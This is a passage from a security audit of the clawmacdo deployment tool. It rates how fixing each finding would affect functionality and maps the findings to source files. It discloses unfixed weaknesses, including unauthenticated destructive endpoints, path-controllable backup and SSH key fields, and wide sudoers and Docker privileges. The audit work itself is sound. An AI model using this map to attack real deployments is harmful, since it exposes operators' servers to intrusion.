| **HIGH-04** | Add `--no-same-owner`, strip `..` entries from tar | **No Impact** | Valid backup archives produced by the claw backup command never contain `..` entries or absolute paths. Adding `--no-same-owner` is harmless since files are subsequently `chown`-ed to the correct user in the restore step. |
| **HIGH-05** | Remove openclaw from docker group; use sudoers | **Moderate** | The `openclaw` user currently runs Docker commands directly (container builds, sandbox images, `docker pull`). Removing group membership requires adding explicit sudoers entries for each Docker subcommand used by OpenClaw (e.g., `docker run`, `docker build`, `docker image inspect`, `docker pull`, `docker tag`). The systemd service `ExecStart` runs `openclaw gateway run`, which spawns Docker containers for sandbox execution — those calls must also go through sudo. Requires auditing all Docker invocations in OpenClaw and testing sandbox mode end-to-end. |
| **HIGH-06** | Replace sudoers wildcards with explicit args | **Low** | The provisioning code in `tailscale.rs` already constructs exact flag combinations (e.g., `tailscale up --auth-key {key} --hostname {hostname}`). Locking the sudoers rules to those exact patterns matches what the code actually invokes. For `journalctl`, restricting to `-u openclaw --no-pager -f` covers the monitoring use case. |
| **HIGH-07** | Canonicalize and restrict `backup` path | **No Impact** | Legitimate backup paths already reside in `~/.clawmacdo/backups/`. Adding a prefix check rejects only attacker-crafted paths while preserving normal deploy-with-backup flows. |
| **HIGH-08** | Restrict `ssh_key_path` to `~/.clawmacdo/keys/` | **No Impact** | All SSH keys generated by the tool are stored in `~/.clawmacdo/keys/{deploy_id}` (see `ssh.rs:generate_keypair()`). Repair endpoints that accept `ssh_key_path` from the web UI already present keys from that directory. Restricting to this directory blocks only illegitimate out-of-tree paths. |
| **HIGH-09** | Minimize env vars passed via `EnvironmentFile` | **Low** | Requires identifying which keys the `openclaw gateway run` process actually uses (likely `ANTHROPIC_API_KEY` only for the gateway; `TELEGRAM_BOT_TOKEN` for the Telegram channel). Splitting `.env` into per-service files or using systemd `Environment=` directives for just the needed keys. OpenClaw's internal key sourcing logic must be verified to not depend on all keys being present in the env. |
| **HIGH-10** | Replace `unwrap()` with `?` / `.context()` | **No Impact** | Proper error handling returns a user-facing error message instead of crashing the process. All callers already handle `Result` — they display the error and continue or abort gracefully. For the Mutex `unwrap()` in the web server, switching to `lock().map_err(...)` prevents permanent server hangs after a panic. |
| **HIGH-11** | Use `Command::env()` per subprocess call | **No Impact** | The AWS CLI is invoked via `std::process::Command` in `lightsail_cli.rs`. Attaching credentials via `.env("AWS_ACCESS_KEY_ID", ...)` on each `Command` builder is functionally equivalent but thread-safe. No change to subprocess behavior. |
| **HIGH-12** | Restrict SSH to deployer IP or Tailscale CIDR | **Moderate** | Requires detecting the deployer's public IP at deploy time (e.g., via `https://checkip.amazonaws.com`). If the deployer's IP changes (dynamic ISP, VPN reconnect), SSH access is lost until the security group is updated. The recommended mitigation is to use Tailscale IPs (already provisioned in step 14) for SSH after initial setup, and restrict the security group to `100.64.0.0/10` (Tailscale CGNAT range). This is only safe if Tailscale provisioning succeeds; a fallback to `0.0.0.0/0` during initial setup may still be needed temporarily. |

### MEDIUM Findings

| ID | Fix Summary | Impact Level | Functionality Impact |
|----|-------------|:------------:|----------------------|
| **MED-01** | Use `serde_json::to_string()` for tag JSON | **No Impact** | Produces identical JSON output for all valid email addresses. Only difference is proper escaping of special characters, which fixes the bug silently. `serde_json` is already a dependency. |
| **MED-02** | Validate IP field; block private ranges | **Low** | Rejects internal hostnames and link-local IPs. All legitimate deployments use public IPs returned by cloud APIs. If any operator is using the repair endpoints against a Tailscale IP (e.g., `100.x.x.x`), the validation rule must whitelist the `100.64.0.0/10` range. |
| **MED-03** | Use `sys.argv` in gen_apikey.sh | **No Impact** | The Python script receives the same arguments, just via a different mechanism. No change to output or behavior for valid inputs. |
| **MED-04** | Use `crypto.randomUUID()` for output paths | **No Impact** | Scan results are written to unpredictable paths. The scan functionality works identically. |
| **MED-05** | Upload authorized_keys via SCP | **Low** | Functionally equivalent. The key ends up at `{home}/.ssh/authorized_keys` with `0600` permissions either way. Requires one additional SCP call during user provisioning. |
| **MED-06** | Replace `.expect()` with `match`/`?` | **No Impact** | The `scan` binary remains a simple CLI tool. Failed spawns return an error message to stderr instead of panicking. |

### LOW Findings

| ID | Fix Summary | Impact Level | Functionality Impact |
|----|-------------|:------------:|----------------------|
| **LOW-01** | Change SCP mode from `0o644` to `0o600` | **No Impact** | Backup archives don't need to be world-readable. The restore step runs as root and can read `0o600` files. |
| **LOW-02** | Set Windows ACLs on SSH private key | **No Impact** | Only affects Windows hosts; existing Unix behavior unchanged. Adds a `#[cfg(windows)]` block alongside the existing `#[cfg(unix)]` block. |
| **LOW-03** | Pin versions and verify checksums for curl\|bash | **Low** | Requires maintaining version pins. If a pinned version becomes unavailable, provisioning fails until the pin is updated. Acceptable tradeoff for supply-chain integrity. |
| **LOW-04** | Set `0o600` on `deployments.db` after creation | **No Impact** | SQLite operates normally with `0600` permissions. Only the current user needs access. |
| **LOW-05** | Set `0o600` on deploy record JSON after writing | **No Impact** | No consumer requires world-readable deploy JSON files. The web server reads them as the same user that wrote them. |
| **LOW-06** | Add SRI integrity hash or bundle Tailwind locally | **Low** | If bundling locally, the binary size increases slightly (Tailwind CSS is ~300KB minified). Alternatively, adding `integrity` + `crossorigin` attributes to the script tag requires regenerating the hash when upgrading Tailwind. The HTML is embedded in the Rust binary, so an update requires recompilation. |
| **LOW-07** | Return generic errors to HTTP clients | **Low** | Operators lose the ability to diagnose remote SSH failures directly from the browser. Server-side logging must be checked instead. Adding a `--debug` flag to `serve` that re-enables verbose HTTP errors for development use would preserve the debugging workflow. |
| **LOW-08** | Use `cp -r` instead of `cp -rL` | **Low** | If any legitimate OpenClaw extensions use symlinks internally, those symlinks are preserved on the target rather than resolved to file copies. This is actually more correct behavior. If an extension relies on resolved symlinks, it would need to be fixed upstream. |

### Summary Matrix

| Impact Level | Count | Finding IDs |
|:------------:|:-----:|-------------|
| **No Impact** | 14 | HIGH-01, HIGH-04, HIGH-07, HIGH-08, HIGH-10, HIGH-11, MED-01, MED-03, MED-04, MED-06, LOW-01, LOW-02, LOW-04, LOW-05 |
| **Low Impact** | 10 | CRIT-03, HIGH-02, HIGH-03, HIGH-06, HIGH-09, MED-02, MED-05, LOW-03, LOW-06, LOW-07 |
| **Moderate Impact** | 4 | CRIT-02, CRIT-04, HIGH-05, HIGH-12 |
| **High Impact** | 1 | CRIT-01 |
| **Blocks Functionality** | 0 | — |

> **Conclusion:** 24 of 30 findings (80%) can be fixed with no or low impact to existing functionality. The 4 moderate-impact fixes require targeted testing of SSH reconnection, Docker sandbox mode, and security group management. CRIT-01 (authentication) is the highest-impact change — it requires a new auth flow — but is also the most urgently needed fix since the server currently accepts unauthenticated requests for destructive operations.

---

## Appendix: File Index

| File Path | Findings |
|-----------|----------|
| `crates/clawmacdo-cli/src/commands/serve.rs` | CRIT-01, HIGH-07, HIGH-08, HIGH-10, MED-02, LOW-06, LOW-07 |
| `crates/clawmacdo-ssh/src/ssh.rs` | CRIT-02, LOW-01, LOW-02 |
| `crates/clawmacdo-provision/src/provision/openclaw.rs` | CRIT-03, HIGH-09 |
| `crates/clawmacdo-cloud/src/cloud_init.rs` | CRIT-04, LOW-03 |
| `crates/clawmacdo-provision/src/provision/commands.rs` | HIGH-01 |
| `crates/clawmacdo-cli/src/commands/deploy.rs` | HIGH-02, HIGH-03, HIGH-04, HIGH-10, HIGH-11, LOW-08 |
| `crates/clawmacdo-provision/src/provision/docker.rs` | HIGH-05 |
| `crates/clawmacdo-provision/src/provision/user.rs` | HIGH-06, MED-05 |
| `crates/clawmacdo-cloud/src/tencent.rs` | HIGH-12 |
| `crates/clawmacdo-cloud/src/lightsail_cli.rs` | MED-01, LOW-03 |
| `crates/clawmacdo-db/src/db.rs` | LOW-04 |
| `crates/clawmacdo-core/src/config.rs` | LOW-05 |
| `crates/clawmacdo-cli/src/bin/scan.rs` | MED-06 |
| `scripts/gen_apikey.sh` | MED-03 |
| `web/server/security_api.js` | MED-04 |
